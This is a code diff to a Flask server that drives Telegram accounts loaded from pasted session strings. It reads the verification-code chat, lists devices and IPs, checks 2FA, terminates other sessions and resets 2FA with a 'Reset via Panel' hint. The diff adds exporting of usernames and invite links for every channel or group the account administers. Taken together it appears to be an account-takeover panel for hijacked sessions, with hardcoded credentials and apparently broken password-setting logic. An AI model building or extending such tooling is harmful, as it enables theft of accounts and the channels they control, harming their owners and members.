@@ -1,7 +1,6 @@
 import asyncio
 import os
 import threading
-import inspect
 
 # 🔥 PYTHON 3.14 FIX
 try:
@@ -22,6 +21,7 @@ from telethon.tl.functions.account import (
     SendVerifyEmailCodeRequest,
     VerifyEmailRequest
 )
+from telethon.tl.functions.channels import ExportInviteRequest
 
 app = Flask(__name__)
 MASTER_ACCESS_KEY = os.environ.get("MASTER_ACCESS_KEY", "noobster")
@@ -30,14 +30,12 @@ accounts = {}
 def check_auth(req):
     return req.headers.get("Authorization") == "secure_token_noobster"
 
-# ---------- persistent loop ----------
 _loop = asyncio.new_event_loop()
 threading.Thread(target=_loop.run_forever, daemon=True).start()
 
 def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, _loop).result()
 
-# ---------- auth ----------
 @app.route('/api/auth', methods=['POST'])
 def auth():
     data = request.json or {}
@@ -69,14 +67,12 @@ def add_account():
     session_str = (data.get('session') or '').strip()
     raw_id = data.get('apiId')
     api_hash = (data.get('apiHash') or '').strip()
-
     if not session_str: return jsonify({"error": "Session required"}), 400
     if not raw_id or not api_hash: return jsonify({"error": "API ID and API Hash required"}), 400
     try:
         api_id = int(raw_id)
     except (TypeError, ValueError):
         return jsonify({"error": "API ID must be numeric"}), 400
-
     try:
         if session_str.startswith(("BQ", "1B")):
             client, me = run_async(login_pyrogram(session_str, api_id, api_hash))
@@ -86,7 +82,6 @@ def add_account():
             atype = "telethon"
             if not client:
                 return jsonify({"error": "Invalid or expired session"}), 401
-
         accounts[str(me.id)] = {"type": atype, "client": client, "me": me,
                                 "api_id": api_id, "api_hash": api_hash, "session": session_str}
         return jsonify({"success": True, "id": str(me.id),
@@ -116,32 +111,20 @@ def get_chats(acc_id):
     return jsonify([{"id": "777000", "name": "Telegram (Notification Bot)",
                      "lastMsg": "Verification codes and service updates"}])
 
-# ---------- 🔧 FIXED: get_messages with correct Pyrogram signature ----------
 @app.route('/api/messages/<acc_id>/<chat_id>', methods=['GET'])
 def get_messages(acc_id, chat_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
     if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
-
-    d = accounts[acc_id]
-    client, atype = d['client'], d['type']
+    d = accounts[acc_id]; client, atype = d['client'], d['type']
     try:
         if atype == 'pyrogram':
-            # Pyrogram: get_messages(chat_id, limit=N) — but some versions differ.
-            # Use the async iterator which is version-safe.
             async def fetch():
                 msgs = []
                 async for m in client.get_chat_history(int(chat_id), limit=20):
                     msgs.append(m)
                 return msgs
-            try:
-                messages = run_async(fetch())
-            except TypeError:
-                # Fallback: raw get_messages positional
-                async def fetch2():
-                    return await client.get_messages(int(chat_id), 20)
-                messages = run_async(fetch2())
-            out = [{"text": (m.text or "[Media]") if m.text is not None else "[Media]",
-                    "isMine": bool(m.outgoing)} for m in reversed(messages)]
+            messages = run_async(fetch())
+            out = [{"text": (m.text or "[Media]"), "isMine": bool(m.outgoing)} for m in reversed(messages)]
         else:
             async def fetch():
                 entity = await client.get_entity(int(chat_id))
@@ -152,37 +135,51 @@ def get_messages(acc_id, chat_id):
     except Exception as e:
         return jsonify({"error": f"Msg Error: {str(e)}"}), 500
 
-# ---------- 🔧 profile with proper 2FA detection ----------
+# ---------- 🔧 admin chats now include username / invite link ----------
+async def _resolve_telethon_entity_info(client, entity):
+    """Returns (username_or_None, invite_link_or_None)."""
+    username = getattr(entity, "username", None)
+    invite = None
+    if not username:
+        try:
+            if getattr(entity, "username", None) is None:
+                # try to pull existing link
+                full = await client.get_entity(entity.id)
+                link = getattr(full, "username", None)
+                if link:
+                    username = link
+        except Exception:
+            pass
+    if not username:
+        try:
+            # try existing exported invite via CheckChatInvite? Simpler: ExportInvite
+            from telethon.tl.functions.messages import ExportChatInviteRequest
+            try:
+                inv = await client(ExportInviteRequest(channel=entity))
+                invite = getattr(inv, "link", None)
+            except Exception:
+                inv = await client(ExportChatInviteRequest(peer=entity))
+                invite = getattr(inv, "link", None)
+        except Exception as e:
+            invite = None
+    return username, invite
+
 @app.route('/api/profile/<acc_id>', methods=['GET'])
 def get_profile(acc_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
     if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
-
     d = accounts[acc_id]; me = d['me']; client = d['client']
     try:
-        has_2fa = False
-        devices = []
-        admin_chats = []
+        has_2fa = False; devices = []; admin_chats = []
 
         if d['type'] == 'pyrogram':
             async def fetch_pyro():
                 fa = False
                 try:
-                    # get_password_hint returns None if no 2FA, hint string if 2FA on
                     hint = await client.get_password_hint()
-                    fa = True if hint is not None else False
+                    fa = hint is not None
                 except Exception:
-                    # fallback: try invoke raw GetPassword
-                    try:
-                        from pyrogram.raw.functions.account import GetPassword
-                        pwd = await client.invoke(GetPassword())
-                        # .has_password on telethon-style not present; use presence of new_algo
-                        fa = getattr(pwd, "has_password", None)
-                        if fa is None:
-                            fa = getattr(pwd, "new_algo", None) is not None or \
-                                 getattr(pwd, "current_algo", None) is not None
-                    except Exception:
-                        fa = False
+                    fa = False
                 devs = []
                 admins = []
                 try:
@@ -195,21 +192,34 @@ def get_profile(acc_id):
                 except Exception:
                     pass
                 try:
-                    async for dlg in client.get_dialogs(limit=50):
+                    async for dlg in client.get_dialogs(limit=100):
                         ch = getattr(dlg, "chat", None)
                         if ch is None: continue
                         ctype = str(getattr(ch, "type", "")).lower()
-                        if "channel" in ctype or "supergroup" in ctype or "group" in ctype:
-                            try:
-                                member = await client.get_chat_member(ch.id, "me")
-                                status = str(getattr(member, "status", "")).lower()
-                                if "owner" in status or "administrator" in status:
-                                    admins.append({
-                                        "name": getattr(ch, "title", "Unnamed"),
-                                        "type": "Owner" if "owner" in status else "Admin"
-                                    })
-                            except Exception:
-                                pass
+                        if not any(k in ctype for k in ("channel", "group", "supergroup")):
+                            continue
+                        try:
+                            member = await client.get_chat_member(ch.id, "me")
+                            status = str(getattr(member, "status", "")).lower()
+                            if "owner" not in status and "administrator" not in status:
+                                continue
+                            is_owner = "owner" in status
+                            username = getattr(ch, "username", None)
+                            invite = None
+                            if not username:
+                                try:
+                                    link = await client.export_chat_invite_link(ch.id)
+                                    invite = link
+                                except Exception:
+                                    invite = None
+                            admins.append({
+                                "name": getattr(ch, "title", "Unnamed"),
+                                "type": "Owner" if is_owner else "Admin",
+                                "username": username,
+                                "invite_link": invite
+                            })
+                        except Exception:
+                            pass
                 except Exception:
                     pass
                 return fa, devs, admins
@@ -221,15 +231,22 @@ def get_profile(acc_id):
                 devs = [{"device": a.device_model, "ip": a.ip, "current": a.current}
                         for a in auths.authorizations]
                 admins = []
-                async for dialog in client.iter_dialogs(limit=50):
-                    if isinstance(dialog.entity, (Channel, Chat)):
-                        try:
-                            perms = await client.get_permissions(dialog.entity, "me")
-                            if perms.is_admin or perms.is_creator:
-                                admins.append({"name": dialog.name,
-                                               "type": "Owner" if perms.is_creator else "Admin"})
-                        except Exception:
-                            pass
+                async for dialog in client.iter_dialogs(limit=100):
+                    if not isinstance(dialog.entity, (Channel, Chat)):
+                        continue
+                    try:
+                        perms = await client.get_permissions(dialog.entity, "me")
+                        if not (perms.is_admin or perms.is_creator):
+                            continue
+                        username, invite = await _resolve_telethon_entity_info(client, dialog.entity)
+                        admins.append({
+                            "name": dialog.name,
+                            "type": "Owner" if perms.is_creator else "Admin",
+                            "username": username,
+                            "invite_link": invite
+                        })
+                    except Exception:
+                        pass
                 return pwd_info.has_password, devs, admins
             has_2fa, devices, admin_chats = run_async(fetch_tele())
 
@@ -263,8 +280,7 @@ def terminate_sessions():
             return count
         count = run_async(terminate())
         if action == "current":
-            run_async(client.disconnect())
-            del accounts[acc_id]
+            run_async(client.disconnect()); del accounts[acc_id]
         return jsonify({"success": True, "message": f"Terminated {count} session(s)."})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -286,11 +302,8 @@ def change_2fa():
             await client(UpdatePasswordSettingsRequest(
                 password=pwd_info,
                 new_settings=PasswordInputSettings(
-                    new_algo=pwd_info.new_algo,
-                    new_password_hash=pwd_info.srp_B,
-                    hint="Reset via Panel", email=None
-                )
-            ))
+                    new_algo=pwd_info.new_algo, new_password_hash=pwd_info.srp_B,
+                    hint="Reset via Panel", email=None)))
             return "SUCCESS"
         result = run_async(set_pwd())
         if result == "NO_2FA":
